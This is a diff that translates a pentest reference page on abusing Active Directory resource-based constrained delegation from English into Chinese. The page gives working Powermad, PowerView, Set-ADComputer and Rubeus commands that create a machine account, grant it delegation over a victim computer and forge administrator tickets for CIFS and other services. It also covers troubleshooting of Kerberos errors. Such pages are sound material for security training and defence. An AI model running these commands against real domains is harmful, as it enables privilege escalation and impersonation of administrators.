@@ -1,4 +1,4 @@
-# Resource-based Constrained Delegation
+# 基于资源的受限委派
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,47 +6,44 @@
 
 {% embed url="https://websec.nl/" %}
 
-## Basics of Resource-based Constrained Delegation
+## 基于资源的受限委派基础
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+这类似于基本的 [Constrained Delegation](constrained-delegation.md)，但**不是**给一个**对象**权限以**代表任何用户对服务进行冒充**。基于资源的受限委派**设置**在**对象中谁能够代表任何用户对其进行冒充**。
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+在这种情况下，受限对象将具有一个名为 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 的属性，包含可以代表任何其他用户对其进行冒充的用户的名称。
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+与其他委派相比，这种受限委派的另一个重要区别是，任何具有**计算机账户的写权限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty等） 的用户都可以设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_（在其他形式的委派中，您需要域管理员权限）。
 
-### New Concepts
+### 新概念
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+在受限委派中提到，用户的 _userAccountControl_ 值中的 **`TrustedToAuthForDelegation`** 标志是执行 **S4U2Self** 所需的。但这并不完全正确。\
+实际上，即使没有该值，如果您是一个**服务**（具有 SPN），您也可以对任何用户执行 **S4U2Self**，但是，如果您**具有 `TrustedToAuthForDelegation`**，返回的 TGS 将是**可转发的**，而如果您**没有**该标志，返回的 TGS **将不会**是**可转发的**。
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+然而，如果在 **S4U2Proxy** 中使用的 **TGS** **不是可转发的**，尝试利用**基本受限委派**将**不起作用**。但如果您尝试利用**基于资源的受限委派，它将有效**（这不是一个漏洞，而是一个特性，显然）。
 
-### Attack structure
+### 攻击结构
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> 如果您对**计算机**账户具有**写等效权限**，则可以在该计算机上获得**特权访问**。
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+假设攻击者已经对受害者计算机具有**写等效权限**。
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. 攻击者**破坏**一个具有**SPN**的账户或**创建一个**（“服务 A”）。请注意，**任何**_管理员用户_在没有其他特殊权限的情况下可以**创建**最多 10 个**计算机对象（**_**MachineAccountQuota**_**）并为其设置一个**SPN**。因此，攻击者可以创建一个计算机对象并设置一个 SPN。
+2. 攻击者**利用其对受害者计算机的写权限**（ServiceB）配置**基于资源的受限委派，以允许 ServiceA 代表任何用户对该受害者计算机（ServiceB）进行冒充**。
+3. 攻击者使用 Rubeus 执行**完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy），从服务 A 到服务 B，针对**具有对服务 B 的特权访问的用户**。
+   1. S4U2Self（来自被破坏/创建的 SPN 账户）：请求**管理员的 TGS 给我**（不可转发）。
+   2. S4U2Proxy：使用前一步的**不可转发 TGS**请求从**管理员**到**受害主机**的**TGS**。
+   3. 即使您使用的是不可转发的 TGS，由于您正在利用基于资源的受限委派，它将有效。
+   4. 攻击者可以**传票**并**冒充**用户以获得对**受害者 ServiceB**的**访问**。
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+要检查域的 _**MachineAccountQuota**_，您可以使用：
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## 攻击
 
-## Attack
+### 创建计算机对象
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+您可以使用 [powermad](https://github.com/Kevin-Robertson/Powermad) 在域内创建计算机对象。
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -54,18 +51,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### 配置基于资源的受限委派
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**使用 activedirectory PowerShell 模块**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-
-**Using powerview**
-
+**使用 powerview**
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -80,55 +73,46 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### 执行完整的 S4U 攻击
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+首先，我们创建了新的计算机对象，密码为 `123456`，因此我们需要该密码的哈希值：
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+这将打印该账户的 RC4 和 AES 哈希。\
+现在，可以执行攻击：
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+您只需使用 Rubeus 的 `/altservice` 参数询问一次即可生成更多票证：
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 > [!CAUTION]
-> Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+> 注意，用户有一个属性叫做“**无法被委托**”。如果用户的此属性为 True，您将无法冒充他。此属性可以在 bloodhound 中查看。
 
-### Accessing
+### 访问
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+最后一条命令将执行 **完整的 S4U 攻击，并将 TGS 从 Administrator 注入到受害主机的 **内存** 中。\
+在此示例中，请求了 Administrator 的 **CIFS** 服务的 TGS，因此您将能够访问 **C$**：
 ```bash
 ls \\victim.domain.local\C$
 ```
+### 滥用不同的服务票证
 
-### Abuse different service tickets
+了解[**可用的服务票证在这里**](silver-ticket.md#available-services)。
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Kerberos 错误
 
-## Kerberos Errors
+- **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着 kerberos 配置为不使用 DES 或 RC4，而您仅提供了 RC4 哈希。至少向 Rubeus 提供 AES256 哈希（或同时提供 rc4、aes128 和 aes256 哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与 DC 的时间不同，kerberos 工作不正常。
+- **`preauth_failed`**：这意味着给定的用户名 + 哈希无法登录。您可能忘记在生成哈希时在用户名中放入“$”（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
+- **`KDC_ERR_BADOPTION`**：这可能意味着：
+  - 您尝试模拟的用户无法访问所需的服务（因为您无法模拟它或因为它没有足够的权限）
+  - 请求的服务不存在（如果您请求 winrm 的票证但 winrm 没有运行）
+  - 创建的 fakecomputer 已失去对易受攻击服务器的权限，您需要将其恢复。
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-- **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-- **`KDC_ERR_BADOPTION`**: This may mean:
-  - The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  - The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  - The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## 参考文献
 
 - [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -140,4 +124,3 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
